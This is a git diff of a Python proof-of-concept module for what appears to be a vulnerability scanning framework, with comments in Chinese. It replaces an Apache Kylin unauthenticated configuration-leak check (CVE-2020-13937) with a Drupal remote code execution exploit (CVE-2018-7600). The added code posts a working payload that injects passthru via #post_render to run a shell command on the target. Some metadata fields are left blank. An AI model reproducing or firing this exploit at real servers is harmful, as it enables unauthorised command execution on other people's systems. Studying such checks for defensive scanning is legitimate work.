@@ -17,21 +17,17 @@ class POC(POCBase):
         略  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "Apache Kylin 未授权配置泄露(CVE-2020-13937)",                        # 漏洞名称
-        "VulnID" : "CVE-2020-13937",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "Apache Kylin",                     # 漏洞应用名称
-        "AppVersion" : """
-            Apahche Kylin 2.x.x
-            Apahche Kylin <= 3.1.0
-            Apahche Kylin 4.0.0-alpha
-        """,                  # 漏洞应用版本
+        "name" : "Drupal!远程代码执行(CVE-2018-7600)",                        # 漏洞名称
+        "VulnID" : "CVE-2018-7600",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "AppName" : "",                     # 漏洞应用名称
+        "AppVersion" : "",                  # 漏洞应用版本
         "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-            Apache Kylin有一个restful api会在没有任何认证的情况下暴露配置信息。
+        
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-            app="APACHE-kylin"
+        
         """,                     # fofa搜索语句
         "example" : "",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
@@ -46,20 +42,21 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "/kylin/api/admin/config" # url自己按需调整
-        
+        url0 = self.target + "/exphub.txt"
+        url = self.target + "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" # url自己按需调整
+        data = 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=passthru&mail[#type]=markup&mail[#markup]=ls'
 
         headers = {"User-Agent":get_random_ua(),
                     "Connection":"close",
-                    # "Content-Type": "application/x-www-form-urlencoded",
+                    "Content-Type": "application/x-www-form-urlencoded",
                     }
         
         try:
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
-            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if '{"config":"' in req.text:#req.status_code == 200 and :
+            req = requests.post(url,data = data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False,allow_redirects=False)
+            if "example.gitignore" in req.text and req.status_code == 200 :
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
